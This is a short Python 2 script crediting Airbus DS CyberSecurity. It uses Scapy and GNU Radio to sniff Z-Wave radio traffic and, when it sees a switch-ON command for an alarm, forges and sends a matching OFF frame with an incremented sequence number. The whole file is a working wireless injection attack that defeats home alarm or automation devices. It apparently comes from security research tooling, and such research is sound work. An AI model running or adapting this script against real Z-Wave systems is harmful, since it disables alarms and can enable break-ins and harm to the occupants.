#!/usr/bin/python2

# Copyright (C) Airbus DS CyberSecurity
# Authors: Jean-Michel Picod, Arnaud Lebrun, Jonathan Christofer Demay

## This program is free software; you can redistribute it and/or modify it 
## under the terms of the GNU General Public License version 3 as
## published by the Free Software Foundation.
##
## This program is distributed in the hope that it will be useful, but
## WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
## General Public License for more details.

from scapy.all import *
import time


class Stop_alarm(Automaton):
    def parse_args(self, *args, **kargs):
        Automaton.parse_args(self, *args, **kargs)

    @ATMT.state(initial=1)
    def BEGIN(self):
        switch_radio_protocol("Zwave")
        self.last_pkt = None
        print "BEGIN"
        raise self.WAITING()

    @ATMT.state()
    def WAITING(self):
        """Wait for the turn on frame """
        print "WAITING"

    @ATMT.receive_condition(WAITING)
    def alarm_on(self, packet_receive):
        """if receive turn on the alarm then go to TURN_OFF_ALARM"""
        human = lambda p, f: p.get_field(f).i2repr(p, getattr(p, f))
        if ZWaveReq in packet_receive:
            self.last_pkt = packet_receive
            if ZWaveSwitchBin in packet_receive:
                if human(packet_receive[ZWaveSwitchBin], 'switchcmd') == "SWITCH":
                    if human(packet_receive[ZWaveSwitchBin], 'val') == "ON":
                        raise self.WAITING()

    @ATMT.action(alarm_on)
    def alarm_off(self):
        time.sleep(0.5)
        print "SWITCH ALARM OFF "
        pkt = self.last_pkt[ZWaveReq].copy()
        pkt[ZWaveSwitchBin].val = "OFF"
        pkt.seqn += 1
        pkt.crc = None
        self.send(pkt)


if __name__ == "__main__":
    load_module('gnuradio')
    Stop_alarm(debug=1).run()
